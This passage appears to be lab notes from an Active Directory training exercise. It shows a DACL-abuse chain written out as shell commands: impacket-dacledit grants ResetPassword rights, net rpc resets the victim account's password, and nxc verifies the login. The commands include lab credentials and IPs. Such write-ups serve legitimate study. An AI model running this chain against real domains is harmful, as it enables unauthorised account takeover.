```shell
impacket-dacledit -principal lilia -target 'Kendra' -dc-ip 10.129.205.81 inlanefreight.local/lilia:DACLPass123 -action write -rights ResetPassword
```
<img width="1862" height="167" alt="Pasted image 20251230184618" src="https://github.com/user-attachments/assets/b27c40bb-4a49-4e37-b8d4-36a09d43c6b2" />
##### Reset Password
```shell
net rpc password kendra NewP@ssward123 -U inlanefreight.local/lilia%DACLPass123 -S 10.129.205.81
```
##### Verify
```shell
nxc smb 10.129.205.81 -u kendra -p NewP@ssward123
```
